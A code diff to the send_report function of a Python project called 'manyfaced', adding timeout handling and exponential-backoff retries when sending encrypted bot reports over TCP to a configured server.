@@ -35,6 +35,11 @@ from manyfaced.common.utils import dump_file, receive_timeout
 logger = get_logger(__name__)
 
 
+REPORT_SEND_MAX_RETRIES = 5
+REPORT_SEND_RETRY_DELAY = 2  # seconds
+REPORT_SEND_BACKOFF_FACTOR = 2  # exponential backoff
+
+
 def send_report(data, client, password, server_host, server_port):
     """Send a bot report to the server as an encrypted TCP message.
 
@@ -66,21 +71,50 @@ def send_report(data, client, password, server_host, server_port):
     }
     message = (client + ":").encode()
     message += cypher.encrypt(json.dumps(data_dict).encode())
-    s = socket(AF_INET, SOCK_STREAM)
-    try:
-        s.connect((server_host, server_port))
-        s.sendall(message)
-        response = s.recv(1024)
-        if not response.decode().startswith("200"):
-            logger.warning("Failed to send report: Non-200 response from server")
-            print(response)
-        s.close()
-        logger.info("Report sent for %s", client)
-    except socket_error:
-        logger.error("Socket error sending report for %s – dumping to file", client)
-        dump_file(data)
-    except KeyboardInterrupt:
-        pass
+
+    # Retry with exponential backoff to handle server restarts
+    delay = REPORT_SEND_RETRY_DELAY
+    for attempt in range(1, REPORT_SEND_MAX_RETRIES + 1):
+        s = socket(AF_INET, SOCK_STREAM)
+        s.settimeout(10)  # don't hang forever on connect
+        try:
+            s.connect((server_host, server_port))
+            s.sendall(message)
+            response = s.recv(1024)
+            if not response.decode().startswith("200"):
+                logger.warning(
+                    "Failed to send report: Non-200 response from server (attempt %d/%d)",
+                    attempt,
+                    REPORT_SEND_MAX_RETRIES,
+                )
+                print(response)
+            s.close()
+            logger.info("Report sent for %s", client)
+            return  # success – stop retrying
+        except socket_error:
+            s.close()
+            if attempt < REPORT_SEND_MAX_RETRIES:
+                logger.debug(
+                    "Report send failed for %s (attempt %d/%d), retrying in %ds",
+                    client,
+                    attempt,
+                    REPORT_SEND_MAX_RETRIES,
+                    delay,
+                )
+                import time
+
+                time.sleep(delay)
+                delay *= REPORT_SEND_BACKOFF_FACTOR
+            else:
+                logger.error(
+                    "Socket error sending report for %s after %d attempts – dumping to file",
+                    client,
+                    REPORT_SEND_MAX_RETRIES,
+                )
+                dump_file(data)
+        except KeyboardInterrupt:
+            s.close()
+            raise
     return
 
 
